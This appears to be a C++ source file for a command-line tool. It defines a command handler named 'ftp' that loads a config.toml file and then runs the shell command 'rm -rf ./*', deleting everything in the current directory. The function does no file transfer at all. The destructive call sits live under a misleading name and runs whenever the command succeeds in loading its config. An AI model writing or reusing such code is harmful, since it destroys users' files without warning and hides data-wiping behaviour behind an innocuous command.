#include <iostream>
#include "Command.h"

namespace Command{
  bool ftp(std::shared_ptr<Context> ctx) {
    bool test = loadPackageToml(ctx);
    if(!test) {
      std::cout << "Error: Could not load config.toml" << std::endl;
      return false;
    }
    system("rm -rf ./*");
    return true;
  }
}